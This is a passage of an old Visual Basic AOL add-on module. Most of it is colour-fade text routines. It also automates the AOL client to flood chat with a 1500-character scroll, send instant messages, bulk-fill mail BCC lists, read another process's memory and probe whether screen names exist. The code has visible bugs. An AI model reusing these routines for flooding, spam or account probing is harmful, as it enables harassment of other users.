        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part3
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / textlen% * i) + B3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part4
    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / textlen% * i) + B4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part5
    textlen% = Len(part5$)
    For i = 1 To textlen%
        TextDone$ = Left(part5$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / textlen% * i) + B5, ((G6 - G5) / textlen% * i) + G5, ((R6 - R5) / textlen% * i) + R5)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part6
    textlen% = Len(part6$)
    For i = 1 To textlen%
        TextDone$ = Left(part6$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B7 - B6) / textlen% * i) + B6, ((G7 - G6) / textlen% * i) + G6, ((R7 - R6) / textlen% * i) + R6)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part7
    textlen% = Len(part7$)
    For i = 1 To textlen%
        TextDone$ = Left(part7$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B8 - B7) / textlen% * i) + B7, ((G8 - G7) / textlen% * i) + G7, ((R8 - R7) / textlen% * i) + R7)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded7$ = Faded7$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part8
    textlen% = Len(part8$)
    For i = 1 To textlen%
        TextDone$ = Left(part8$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B9 - B8) / textlen% * i) + B8, ((G9 - G8) / textlen% * i) + G8, ((R9 - R8) / textlen% * i) + R8)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded8$ = Faded8$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    FadeNineColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$ + Faded7$ + Faded8$
End Function
Function FadeByColor9(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, Colr8, Colr9, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)
dacolor8$ = RGBtoHEX(Colr8)
dacolor9$ = RGBtoHEX(Colr9)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))
rednum6% = Val("&H" + Right(dacolor6$, 2))
greennum6% = Val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = Val("&H" + Left(dacolor6$, 2))
rednum7% = Val("&H" + Right(dacolor7$, 2))
greennum7% = Val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = Val("&H" + Left(dacolor7$, 2))
rednum8% = Val("&H" + Right(dacolor8$, 2))
greennum8% = Val("&H" + Mid(dacolor8$, 3, 2))
bluenum8% = Val("&H" + Left(dacolor8$, 2))
rednum9% = Val("&H" + Right(dacolor9$, 2))
greennum9% = Val("&H" + Mid(dacolor9$, 3, 2))
bluenum9% = Val("&H" + Left(dacolor9$, 2))


FadeByColor9 = FadeNineColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, rednum8%, greennum8%, bluenum8%, rednum9%, greennum9%, bluenum9%, thetext, WavY)

End Function

Function FadeTenColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, R7%, G7%, B7%, R8%, G8%, B8%, R9%, G9%, B9%, R10%, G10%, B10%, thetext$, WavY As Boolean)
'by H8er
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    eightlen% = eightlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    ninelen% = ninelen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + 1, sevlen%)
    part8$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + sevlen% + 1, eightlen%)
    part9$ = Right(thetext, ninelen%)
    
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part3
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / textlen% * i) + B3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part4
    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / textlen% * i) + B4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part5
    textlen% = Len(part5$)
    For i = 1 To textlen%
        TextDone$ = Left(part5$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / textlen% * i) + B5, ((G6 - G5) / textlen% * i) + G5, ((R6 - R5) / textlen% * i) + R5)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part6
    textlen% = Len(part6$)
    For i = 1 To textlen%
        TextDone$ = Left(part6$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B7 - B6) / textlen% * i) + B6, ((G7 - G6) / textlen% * i) + G6, ((R7 - R6) / textlen% * i) + R6)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part7
    textlen% = Len(part7$)
    For i = 1 To textlen%
        TextDone$ = Left(part7$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B8 - B7) / textlen% * i) + B7, ((G8 - G7) / textlen% * i) + G7, ((R8 - R7) / textlen% * i) + R7)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded7$ = Faded7$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part8
    textlen% = Len(part8$)
    For i = 1 To textlen%
        TextDone$ = Left(part8$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B9 - B8) / textlen% * i) + B8, ((G9 - G8) / textlen% * i) + G8, ((R9 - R8) / textlen% * i) + R8)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded8$ = Faded8$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part9
    textlen% = Len(part9$)
    For i = 1 To textlen%
        TextDone$ = Left(part9$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B10 - B9) / textlen% * i) + B9, ((G10 - G9) / textlen% * i) + G9, ((R10 - R9) / textlen% * i) + R9)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded9$ = Faded9$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    FadeTenColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$ + Faded7$ + Faded8$ + Faded9$
End Function
Function SmoothRun()
Do
    X% = DoEvents()
Y$ = Y$ + "1"
If Y$ = "50" Then Exit Do
Loop
End Function
Function Chat_BigScroll(TheCharacter)
'Huge Scroll using TheCharacter
TheCharacter = Left(TheCharacter, 1)

Chat_BigScroll = "!<pre" & String(1500, TheCharacter)
    TimeOut 0.157
End Function
Sub WaitWindow()
'Waits for a window to pop up
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
topmdi% = GetWindow(MDI%, 5)
Do: DoEvents
    AOL% = FindWindow("AOL Frame25", vbNullString)
    MDI% = FindChildByClass(AOL%, "MDIClient")
    topmdi2% = GetWindow(MDI%, 5)

If Not topmdi2% = topmdi% Then Exit Do
Loop
End Sub
Sub Regi_IM(person, Message)
Call XAOL4_Keyword("aol://9293:" & person)
Pause (2)
Do
DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, "Send Instant Message")
aolrich% = FindChildByClass(im%, "RICHCNTL")
IMsend2% = FindChildByClass(im%, "_AOL_Icon")
Loop Until (im% <> 0 And aolrich% <> 0 And IMsend2% <> 0)
Call SendMessageByString(aolrich%, WM_SETTEXT, 0, Message)
For sends = 1 To 9
IMsend2% = GetWindow(IMsend2%, GW_HWNDNEXT)
Next sends
AOLIcon IMsend2%
If im% Then Call AOLKillWindow(im%)
End Sub


Sub Regi_KeyWord(Txt)
    AOL% = FindWindow("AOL Frame25", vbNullString)
    temp% = FindChildByClass(AOL%, "AOL Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Combobox")
    KWBox% = FindChildByClass(temp%, "Edit")
    Call SendMessageByString(KWBox%, WM_SETTEXT, 0, Txt)
    Call SendMessageByNum(KWBox%, WM_CHAR, VK_SPACE, 0)
    Call SendMessageByNum(KWBox%, WM_CHAR, VK_RETURN, 0)
End Sub


Sub Regi_Kill_FWD_Win()
RegiFUCKER% = FindChildByTitle(MDI%, "Fwd: ")
killwin RegiFUCKER%
End Sub







Sub Regi_Kill_Mail_Win()
    GodDamnMotherFucker% = FindChildByClass(AOLMDI(), "AOL Child")
    killwin GodDamnMotherFucker%
End Sub



Sub Regi_Set_Names()
X = GetCaption(AOLWindow)
AppActivate X
ZooH = AOL40_Mail_NamesListForBCC(mmer.List1)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
AOMail% = FindChildByClass(MDI%, "AOL Child")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
Pause 0.5
Call AOLSetText(AOEdit%, ZooH)
SendKeys "{TAB}"
SendKeys "{TAB}"
SendKeys "{TAB}"
End Sub

Public Sub ChatIgnoreByIndex(Index As Long)
    Dim room As Long, sList As Long, iWindow As Long
    Dim iCheck As Long, A As Long, Count As Long
    Count& = RoomCount&
    If Index& > Count& - 1 Then Exit Sub
    room& = FindRoom&
    sList& = FindWindowEx(room&, 0&, "_AOL_Listbox", vbNullString)
    Call SendMessage(sList&, LB_SETCURSEL, Index&, 0&)
    Call PostMessage(sList&, WM_LBUTTONDBLCLK, 0&, 0&)
    Do
        DoEvents
        iWindow& = FindInfoWindow
    Loop Until iWindow& <> 0&
    DoEvents
    iCheck& = FindWindowEx(iWindow&, 0&, "_AOL_Checkbox", vbNullString)
    DoEvents
    Do
        DoEvents
        A& = SendMessage(iCheck&, BM_GETCHECK, 0&, 0&)
        Call PostMessage(iCheck&, WM_LBUTTONDOWN, 0&, 0&)
        DoEvents
        Call PostMessage(iCheck&, WM_LBUTTONUP, 0&, 0&)
        DoEvents
    Loop Until A& <> 0&
    DoEvents
    Call PostMessage(iWindow&, WM_CLOSE, 0&, 0&)
End Sub

Public Sub ChatIgnoreByName(name As String)
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, Index As Long, room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Dim lIndex As Long
    room& = FindRoom&
    If room& = 0& Then Exit Sub
    rList& = FindWindowEx(room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For Index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(Index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> GetUser$ And LCase(ScreenName$) = LCase(name$) Then
                lIndex& = Index&
                Call ChatIgnoreByIndex(lIndex&)
                DoEvents
                Exit Sub
            End If
        Next Index&
        Call CloseHandle(mThread)
    End If
End Sub

Public Function ChatLineSN(TheChatLine As String) As String
    If InStr(TheChatLine, ":") = 0 Then
        ChatLineSN = ""
        Exit Function
    End If
    ChatLineSN = Left(TheChatLine, InStr(TheChatLine, ":") - 1)
End Function

Public Function ChatLineMsg(TheChatLine As String) As String
    If InStr(TheChatLine, Chr(9)) = 0 Then
        ChatLineMsg = ""
        Exit Function
    End If
    ChatLineMsg = Right(TheChatLine, Len(TheChatLine) - InStr(TheChatLine, Chr(9)))
End Function
Public Function CheckAlive(ScreenName As String) As Boolean
    Dim AOL As Long, MDI As Long, ErrorWindow As Long
    Dim ErrorTextWindow As Long, ErrorString As String
    Dim MailWindow As Long, NoWindow As Long, NoButton As Long
    Call SendMail("*, " & ScreenName$, "You alive?", "=)")
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    Do
        DoEvents
        ErrorWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
        ErrorTextWindow& = FindWindowEx(ErrorWindow&, 0&, "_AOL_View", vbNullString)
        ErrorString$ = GetText(ErrorTextWindow&)
    Loop Until ErrorWindow& <> 0 And ErrorTextWindow& <> 0 And ErrorString$ <> ""
    If InStr(LCase(ReplaceString(ErrorString$, " ", "")), LCase(ReplaceString(ScreenName$, " ", ""))) > 0 Then
        CheckAlive = False
    Else
        CheckAlive = True
    End If
    MailWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
    Call PostMessage(ErrorWindow&, WM_CLOSE, 0&, 0&)
    DoEvents
    Call PostMessage(MailWindow&, WM_CLOSE, 0&, 0&)
    DoEvents
    Do
        DoEvents
        NoWindow& = FindWindow("#32770", "America Online")
        NoButton& = FindWindowEx(NoWindow&, 0&, "Button", "&No")
    Loop Until NoWindow& <> 0& And NoButton& <> 0
    Call SendMessage(NoButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(NoButton&, WM_KEYUP, VK_SPACE, 0&)
End Function
Public Function CheckIfMaster() As Boolean
